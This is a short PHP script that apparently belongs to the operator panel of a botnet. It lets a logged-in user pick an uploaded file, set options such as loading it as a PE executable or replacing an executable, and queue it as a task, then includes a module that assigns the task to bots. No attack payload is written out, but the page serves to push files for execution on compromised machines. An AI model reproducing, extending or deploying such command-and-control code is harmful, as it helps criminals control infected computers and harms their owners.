<?
	include_once "../common.php";
	include_once ROOT_PATH."/mod/files.php";
	include_once ROOT_PATH."/mod/tasks.php";
	if( !$user->Check() ) exit;

	if( !(isset($_POST['file']) && isset($_POST['note'])) )
	{
		$RES = Array();
		$files = GetFiles();
		if($files) foreach($files as $v)
		{
			$RES[] = Array('FID'=>$v['fId'], 'FNAME'=>$v['fName'], 'FTYPE'=>$v['fType']);
		}
		$smarty->assign('FILES', $RES);
		$smarty->assign('EXT', $file_ext);
		$smarty->assign('FILEID', $file_id);
		
		//var_dump($_POST);
		$smarty->display('create_task.tpl');
		die();
	}
	
	$file = (int)$_POST['file']; 	if( $file == 0 ) die( "<font class='error'>Plz, select file!</font>" );
	$note = $_POST['note'];
	if( isset($_POST['pe_loader']) ) $peload = 1; else $peload = 0;
	if( isset($_POST['repl_exe']) ) $replexe = 1; else $replexe = 0;
    $isUnlimit = isset($_POST['isUnlimit']) ? $_POST['isUnlimit'] : 0;
	if( $tid = AddTask($file, $note, $peload, $replexe, $isUnlimit) )
	{
		$smarty->assign('TASK', $tid);
		include_once ROOT_PATH."/mod/add_bots.php";
	}
	else echo "<font class='error'>Create task error!</font>";
?>